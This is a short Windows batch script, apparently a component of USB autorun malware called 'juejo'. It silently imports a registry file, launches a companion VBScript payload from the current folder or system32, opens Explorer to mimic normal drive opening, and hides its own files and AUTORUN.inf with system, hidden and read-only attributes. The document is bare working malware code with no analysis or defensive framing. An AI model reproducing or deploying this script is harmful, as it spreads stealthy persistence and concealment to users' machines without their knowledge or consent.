@echo off
ren juejo forevermente...
if exist .\juejo.reg regedit /s .\juejo.reg
ren 10x10
if not "%1"=="" goto abrir
if exist juejo.vbs start WScript.exe juejo.vbs&exit
if exist %SYSTEMROOT%\system32\juejo.vbs start WScript.exe %SYSTEMROOT%\system32\juejo.vbs&exit
exit
:abrir
if not "%1"=="abrir" goto ava
start explorer .\
exit
:ava
if "%1"=="+" attrib +s +a +h +r %2\juejo.*
if "%1"=="+" attrib +s +a +h +r %2\AUTORUN.inf
:end

